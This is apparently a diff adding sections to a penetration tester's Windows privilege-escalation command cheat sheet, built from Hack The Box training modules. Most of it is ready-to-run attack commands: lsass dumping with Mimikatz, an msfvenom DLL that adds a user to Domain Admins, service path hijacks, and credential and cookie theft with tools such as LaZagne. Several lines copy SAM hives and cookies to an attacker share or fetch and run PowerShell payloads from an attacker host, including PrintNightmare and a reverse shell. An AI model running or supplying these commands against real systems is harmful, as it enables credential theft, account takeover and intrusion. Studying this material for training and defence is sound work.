@@ -324,4 +324,496 @@ msiexec /quiet /qn /i C:\Temp\shell.msi
 
 ---
 
-#### Tags: #WindowsPrivesc #CommandAppendix #Module17 #DLLHijack #ServiceBinaryHijacking #UnquotedServicePath #ScheduledTasks #KernelExploit #SeImpersonatePrivilege #SeBackupPrivilege #winPEAS #PowerUp #SigmaPotato #CVE202328252 #CVE202329360
+---
+
+## AppLocker Enumeration (HTB Supplementary)
+
+```powershell
+# See all effective rules (allows and denies)
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# Export to XML for offline review
+Get-AppLockerPolicy -Effective -Xml
+
+# Check which rules deny a specific binary
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections | Where-Object {$_.Action -eq 'Deny'}
+```
+
+Key fields: `PathConditions` = the blocked path, `Action = Deny` = blocked, `UserOrGroupSid = S-1-1-0` = applies to Everyone.
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.1. Situational Awareness|WPE.1]].
+
+#### Tags: #AppLocker #Enumeration #WindowsPrivesc
+
+---
+
+## Named Pipe ACL Inspection (HTB Supplementary)
+
+```cmd
+:: List all named pipes
+accesschk.exe -accepteula -w \pipe\* -v 2>nul
+
+:: Check specific pipe
+accesschk.exe -accepteula -w \pipe\SQLLocal\SQLEXPRESS01 -v
+
+:: What to look for:
+:: WRITE_DAC → modify the pipe's ACL (then grant yourself access)
+:: FILE_ALL_ACCESS → full control
+```
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.3. Communication with Processes (Named Pipes)|WPE.3]].
+
+#### Tags: #NamedPipe #AccessChk #WindowsPrivesc
+
+---
+
+## SeDebugPrivilege — lsass Dump (HTB Supplementary)
+
+```cmd
+:: Step 1: dump lsass (requires elevated CMD — SeDebugPrivilege may show Disabled, still works)
+cd C:\Tools\Procdump
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+:: Step 2: parse dump with Mimikatz
+copy lsass.dmp C:\Tools\Mimikatz\x64\
+cd C:\Tools\Mimikatz\x64\
+mimikatz.exe
+```
+
+Inside Mimikatz:
+
+```
+log
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+:: Look for: * NTLM : <hash> under each user's entry
+```
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.5. SeDebugPrivilege|WPE.5]], [[Password Attacks#Mimikatz|Mimikatz appendix]].
+
+#### Tags: #SeDebugPrivilege #lsass #Mimikatz #CredentialDump #WindowsPrivesc
+
+---
+
+## SeTakeOwnershipPrivilege (HTB Supplementary)
+
+```powershell
+:: Enable the privilege (it may show Disabled in whoami /priv)
+cd C:\Tools
+Import-Module .\Enable-Privilege.ps1
+.\EnableAllTokenPrivs.ps1
+
+:: Take ownership of the file
+takeown /f 'C:\path\to\file.txt'
+
+:: Grant yourself read/write (ownership alone doesn't give read access)
+icacls 'C:\path\to\file.txt' /grant <username>:F
+
+:: Read the file
+cat 'C:\path\to\file.txt'
+```
+
+High-value targets: `C:\Windows\System32\config\SAM`, `C:\Windows\System32\config\SYSTEM`, any protected file.
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.6. SeTakeOwnershipPrivilege|WPE.6]].
+
+#### Tags: #SeTakeOwnershipPrivilege #takeown #icacls #WindowsPrivesc
+
+---
+
+## SeLoadDriverPrivilege — Capcom Exploit (HTB Supplementary)
+
+Requires Print Operators group membership (which grants SeLoadDriverPrivilege).
+
+```cmd
+:: Step 1: EoPLoadDriver enables privilege, creates registry key, loads driver
+cd C:\Tools
+EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+:: Expected: [+] SeLoadDriverPrivilege Enabled; NTSTATUS: 00000000
+
+:: Step 2: use the loaded driver to steal SYSTEM token
+cd \Tools\ExploitCapcom
+ExploitCapcom.exe
+:: Expected: [+] Token stealing was successful; [+] The SYSTEM shell was launched
+:: A new CMD window opens as SYSTEM
+```
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.10. Print Operators (SeLoadDriverPrivilege)|WPE.10]].
+
+#### Tags: #SeLoadDriverPrivilege #PrintOperators #Capcom #EoPLoadDriver #WindowsPrivesc
+
+---
+
+## Event Log Readers — Credential Mining (HTB Supplementary)
+
+```powershell
+:: Confirm membership
+net localgroup "Event Log Readers"
+
+:: Search Security log for cleartext credentials (process creation audit events)
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+
+:: Also useful:
+wevtutil qe Security /rd:true /f:text | Select-String "password"
+
+:: Filter by Event ID 4688 (Process Creation with command line logging)
+wevtutil qe Security /rd:true /f:text /q:"*[System[EventID=4688]]" | Select-String "/pass"
+```
+
+Look for: `net use /user:<user> <pass>`, `cmdkey /add: /user: /pass:`, `runas /user: ...`.
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.8. Event Log Readers|WPE.8]].
+
+#### Tags: #EventLogReaders #wevtutil #CredentialHunting #WindowsPrivesc
+
+---
+
+## DnsAdmins — Malicious DLL Injection (HTB Supplementary)
+
+```bash
+# Step 1: craft a DLL payload on attack box
+msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> /add /domain' -f dll -o adduser.dll
+python3 -m http.server 7777
+```
+
+```cmd
+:: Step 2: on target (as DnsAdmins member), download and load the DLL
+wget "http://PWNIP:7777/adduser.dll" -outfile "adduser.dll"
+dnscmd.exe /config /serverlevelplugindll C:\Users\<user>\adduser.dll
+
+:: Step 3: restart DNS to trigger DLL load (service may fail to start — payload still runs)
+sc stop dns
+sc start dns
+
+:: Step 4: verify Domain Admin membership
+net group "Domain Admins" /dom
+```
+
+Then re-authenticate (sign out + RDP back in) to get the new group token.
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.9. DnsAdmins Group|WPE.9]].
+
+#### Tags: #DnsAdmins #dnscmd #DLLInjection #WindowsPrivesc
+
+---
+
+## Server Operators — Service Binary Path Hijack (HTB Supplementary)
+
+```cmd
+:: Step 1: find a service running as LocalSystem
+sc qc AppReadiness
+:: Confirms: SERVICE_START_NAME : LocalSystem
+
+:: Step 2: change its binary to a command that adds your user to local Admins
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators <user> /add"
+
+:: Step 3: start the service (will fail with 1053 — expected, payload still runs)
+sc start AppReadiness
+
+:: Step 4: verify local admin membership
+net localgroup Administrators
+
+:: Step 5: sign out and reconnect — now have local admin token
+```
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.11. Server Operators|WPE.11]].
+
+#### Tags: #ServerOperators #ServiceConfigHijack #WindowsPrivesc
+
+---
+
+## Credential Hunting — Windows-Specific Sources (HTB Supplementary)
+
+```powershell
+## findstr sweep (config files)
+cd C:\Users
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+
+## Sticky Notes (plum.sqlite) — requires PSSQLite module
+$db = 'C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
+Import-Module C:\Tools\PSSQLite\PSSQLite.psd1
+Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
+
+## Get-LocalUser Description field (passwords stored in description)
+Get-LocalUser
+
+## Windows Credential Manager saved credentials
+cmdkey /list
+
+## unattend.xml (provisioning credentials)
+type C:\Windows\Panther\unattend.xml
+findstr /si "password" C:\Windows\Panther\*.xml
+
+## PSReadLine history (PowerShell command history)
+cat (Get-PSReadlineOption).HistorySavePath
+
+## Registry credential hunting
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.16. Credential Hunting|WPE.16]], [[Windows Privilege Escalation (HTB Supplementary)#WPE.17. Other Files (Sticky Notes, plum.sqlite)|WPE.17]], [[Windows Privilege Escalation (HTB Supplementary)#WPE.22. Miscellaneous Techniques|WPE.22]].
+
+#### Tags: #CredentialHunting #findstr #StickyNotes #unattendxml #WindowsPrivesc
+
+---
+
+## LaZagne, SharpChrome, SessionGopher (HTB Supplementary)
+
+```powershell
+## LaZagne — multi-source credential dump (browsers, DB clients, WinSCP, etc.)
+.\lazagne.exe all
+
+## SharpChrome — decrypt Chrome saved passwords (DPAPI, current user)
+.\SharpChrome.exe logins /unprotect
+
+## SessionGopher — WinSCP, PuTTY, RDP saved sessions
+Import-Module .\SessionGopher.ps1
+Invoke-SessionGopher -Target <hostname>
+# For local only: Invoke-SessionGopher -Thorough
+```
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.18. Further Credential Theft|WPE.18]].
+
+#### Tags: #LaZagne #SharpChrome #SessionGopher #CredentialDump #WindowsPrivesc
+
+---
+
+## mRemoteNG — Decrypt Saved Passwords (HTB Supplementary)
+
+```powershell
+## Find config file
+cmd /c more "%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml"
+## Look for: Password="<base64-blob>"
+```
+
+```bash
+# Decrypt on attack box (default: no master password)
+python3 mremoteng_decrypt.py -s "<base64-blob>"
+
+# With custom master password:
+python3 mremoteng_decrypt.py -s "<base64-blob>" -p "<masterpassword>"
+```
+
+Source: `https://github.com/haseebT/mRemoteNG-Decrypt`
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.21. Pillaging|WPE.21]].
+
+#### Tags: #mRemoteNG #CredentialDecrypt #Pillaging #WindowsPrivesc
+
+---
+
+## Firefox Cookie Theft — Session Hijacking (HTB Supplementary)
+
+```cmd
+:: Copy Firefox cookie database from victim to attacker SMB share
+copy "C:\Users\<victim>\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite" \\PWNIP\share\
+```
+
+```bash
+# On attack box: extract session cookie for target domain
+python3 cookieextractor.py --dbpath cookies.sqlite --host <domain>
+# Output: cookie name and value
+```
+
+Then in the victim's browser: Cookie-Editor extension → find the cookie by name → replace value → save → refresh.
+
+Source: `https://github.com/juliourena/plaintext/blob/master/Scripts/cookieextractor.py`
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.21. Pillaging|WPE.21]].
+
+#### Tags: #CookieTheft #Firefox #SessionHijacking #Pillaging #WindowsPrivesc
+
+---
+
+## Restic Backup — SAM/SYSTEM Extraction (HTB Supplementary)
+
+```powershell
+## List snapshots (check for Windows\System32\config backups)
+restic.exe -r E:\restic snapshots
+# Enter repo password when prompted
+
+## Restore a specific snapshot
+restic.exe -r E:\restic restore <snapshot-id> --target C:\Users\<user>\Restore
+
+## Copy hive files to attacker SMB share
+copy C:\Users\<user>\Restore\C\Windows\System32\config\SAM \\PWNIP\share\
+copy C:\Users\<user>\Restore\C\Windows\System32\config\SYSTEM \\PWNIP\share\
+```
+
+```bash
+# Dump hashes offline
+impacket-secretsdump -sam SAM -system SYSTEM local
+```
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.21. Pillaging|WPE.21]].
+
+#### Tags: #Restic #BackupExtraction #SecretsDump #Pillaging #WindowsPrivesc
+
+---
+
+## SCF File Attack — Responder Hash Capture (HTB Supplementary)
+
+```
+# SCF file content (save as @Inventory.scf in a shared folder)
+[Shell]
+Command=2
+IconFile=\\PWNIP\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+```bash
+# Start Responder before placing the file
+sudo responder -w -v -I tun0
+
+# Crack the captured NTLMv2 hash
+hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+Key: `@` prefix sorts the file first alphabetically so it loads the moment the folder is opened in Explorer. The NTLMv2 hash captures the opener's credentials.
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.20. Interacting with Users (SCF File Attack)|WPE.20]], [[Secrets & Credentials#Responder|Responder appendix]].
+
+#### Tags: #SCFAttack #Responder #NetNTLMv2 #UserInteraction #WindowsPrivesc
+
+---
+
+## CVE-2021-36934 (HiveNightmare / SeriousSAM) (HTB Supplementary)
+
+Affects Windows 10 builds 1809 through 21H1. VSS shadow copies of SAM/SYSTEM/SECURITY are world-readable.
+
+```powershell
+:: Use pre-compiled PoC (C:\Tools\CVE-2021-36934.exe)
+.\CVE-2021-36934.exe
+:: Output: SAM hashes for all local users including Administrator
+```
+
+```bash
+# PtH with the NTLM hash
+smbclient -U administrator '\\STMIP\C$' --pw-nt-hash
+# Enter NTLM hash as password (NT portion only, not full string)
+```
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.14. Kernel Exploits (HiveNightmare / CVE-2021-36934)|WPE.14]].
+
+#### Tags: #HiveNightmare #CVE202136934 #SeriousSAM #KernelExploit #WindowsPrivesc
+
+---
+
+## PrintNightmare CVE-2021-1675 (HTB Supplementary)
+
+```bash
+# Prep PoC on attack box (add the invoke line at the bottom of the PS1)
+git clone https://github.com/calebstewart/CVE-2021-1675.git
+echo 'Invoke-Nightmare -NewUser "Hacker" -NewPassword "Pwnd1234!" -DriverName "Printyboi"' >> CVE-2021-1675.ps1
+python3 -m http.server 8080
+```
+
+Delivery via command injection or any code execution:
+
+```powershell
+IEX(New-Object Net.Webclient).downloadString('http://PWNIP:8080/CVE-2021-1675.ps1')
+# Creates Hacker:Pwnd1234! with local admin rights
+```
+
+Also works via authenticated SMB as a domain or local user with a Spooler service.
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.25. Skills Assessment Part I|WPE.25]].
+
+#### Tags: #PrintNightmare #CVE20211675 #SpoolerAbuse #WindowsPrivesc
+
+---
+
+## Sherlock.ps1 / Windows-Exploit-Suggester (Old OS) (HTB Supplementary)
+
+```powershell
+## Sherlock — PowerShell-based missing patch check (Windows 7/2008 era)
+Import-Module .\Sherlock.ps1
+Find-AllVulns
+## Look for: VulnStatus: Appears Vulnerable
+```
+
+```bash
+## Windows-Exploit-Suggester — takes systeminfo output, cross-references MS patch DB
+# Update database (generates YYYY-MM-DD-mssb.xls)
+python2 windows-exploit-suggester.py --update
+
+# Run against captured systeminfo output
+python2 windows-exploit-suggester.py --database YYYY-MM-DD-mssb.xls --systeminfo sysinfo.txt
+# Flags: [E] = exploitdb PoC, [M] = Metasploit module
+```
+
+Key old-OS exploits:
+
+| Bulletin | CVE | Target | Tool |
+|----------|-----|--------|------|
+| MS10-092 | 2010-3338 | Win 7/2008 R2 | MSF `windows/local/ms10_092_schelevator` |
+| MS16-032 | 2016-0099 | Win 7-10 | Invoke-MS16-032.ps1 (GitHub) |
+| CVE-2021-36934 | HiveNightmare | Win10 1809-21H1 | CVE-2021-36934.exe |
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.23. Windows Server (Old OS)|WPE.23]], [[Windows Privilege Escalation (HTB Supplementary)#WPE.24. Windows Desktop (Old OS)|WPE.24]].
+
+#### Tags: #Sherlock #WindowsExploitSuggester #OldOS #MS10092 #MS16032 #WindowsPrivesc
+
+---
+
+## PwDump8 — Local Hash Extraction (HTB Supplementary)
+
+```cmd
+:: Run as SYSTEM or local admin
+C:\path\to\pwdump8.exe
+:: Output: username:RID:LM_hash:NTLM_hash (CSV format)
+:: LM portion is always aad3b435b51404eeaad3b435b51404ee (empty) on modern Windows
+```
+
+```bash
+# Crack NTLM hashes offline
+hashcat -m 1000 <ntlm_hash> /usr/share/wordlists/rockyou.txt
+```
+
+Alternative when you have SYSTEM meterpreter: `hashdump` built-in.
+
+See [[Windows Privilege Escalation (HTB Supplementary)#WPE.26. Skills Assessment Part II|WPE.26]], [[Password Attacks#SAM offline dump|SAM offline dump]].
+
+#### Tags: #PwDump8 #HashDump #LocalHashes #WindowsPrivesc
+
+---
+
+---
+
+## SysaxAutomation Privilege Escalation
+
+SysaxAutomation is a Windows automation tool with a service running as SYSTEM. If the current user can create or modify a file-triggered task, the task's payload runs as SYSTEM.
+
+**Detection:** Look for `sysaxschedscp.exe` in running processes or installed applications.
+
+**Exploitation (requires access to sysaxschedscp.exe — even a low-priv user can add tasks):**
+
+1. Create a batch payload in a writable directory (e.g., `%USERPROFILE%\Documents\pwn.bat`):
+
+```cmd
+net localgroup administrators <USERNAME> /add
+```
+
+2. Open `sysaxschedscp.exe` → Setup Scheduled/Triggered Tasks → Add task (Triggered).
+3. Set:
+   - Folder to Monitor: a directory the current user controls (e.g., `C:\Users\<user>\Documents\`)
+   - Check: "Run task if a file is added to the monitor folder or subfolder(s)"
+   - Program to run: full path to `pwn.bat`
+   - Uncheck "Login as the following user to run task" (runs as SYSTEM if unchecked)
+4. Click Finish.
+5. Create any new file in the monitored folder to trigger the task.
+6. Confirm with `net localgroup administrators`.
+
+**Alternative payloads instead of net localgroup:**
+- Add an SSH authorized_keys entry for persistence
+- Execute a reverse shell: `cmd /c powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://PWNIP/shell.ps1')"`
+
+See [[Attacking Enterprise Networks (HTB Supplementary)#AEN.8. Lateral Movement|AEN.8 Q3]] for the full example.
+
+#### Tags: #SysaxAutomation #FileTriggeredTask #WindowsPrivesc #ScheduledTasks #HTBSupplementary
+
+---
+
+#### Tags: #WindowsPrivesc #CommandAppendix #Module17 #DLLHijack #ServiceBinaryHijacking #UnquotedServicePath #ScheduledTasks #KernelExploit #SeImpersonatePrivilege #SeBackupPrivilege #winPEAS #PowerUp #SigmaPotato #CVE202328252 #CVE202329360 #SeDebugPrivilege #SeTakeOwnershipPrivilege #SeLoadDriverPrivilege #AppLocker #DnsAdmins #ServerOperators #EventLogReaders #HiveNightmare #PrintNightmare #CredentialHunting #mRemoteNG #SCFAttack #LaZagne #SharpChrome #SessionGopher #Restic #Pillaging #SysaxAutomation #HTBSupplementary
